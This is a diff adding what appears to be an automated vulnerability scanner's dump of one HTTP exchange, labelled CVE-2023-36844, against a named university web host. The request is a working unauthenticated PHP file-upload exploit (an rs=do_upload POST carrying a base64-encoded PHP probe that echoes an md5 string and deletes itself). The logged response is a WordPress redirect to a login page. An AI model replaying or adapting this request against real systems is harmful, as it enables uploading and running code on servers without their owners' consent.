@@ -1,0 +1,25 @@
+[CVE-2023-36844] Dumped HTTP request for https://paintrainer-uat.app.unimelb.edu.au/webauth_operation.php
+
+
+POST /webauth_operation.php HTTP/1.1
+Host: paintrainer-uat.app.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 176
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+rs=do_upload&rsargs[]=[{"fileData": "data:text/html;base64,KCc8P3BocCBlY2hvIG1kNSgnQ1ZFLTIwMjMtMzY4NDQnKTt1bmxpbmsoX19GSUxFX18pOz8+Jyk=", "fileName": "bacbc.php", "csize": 56}]
+[CVE-2023-36844] Dumped HTTP response https://paintrainer-uat.app.unimelb.edu.au/webauth_operation.php
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:18:07 GMT
+Location: https://paintrainer-uat.app.unimelb.edu.au/login-to-paintrainer/
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Powered-By: PHP/7.4.3
+X-Redirect-By: WordPress
+
+
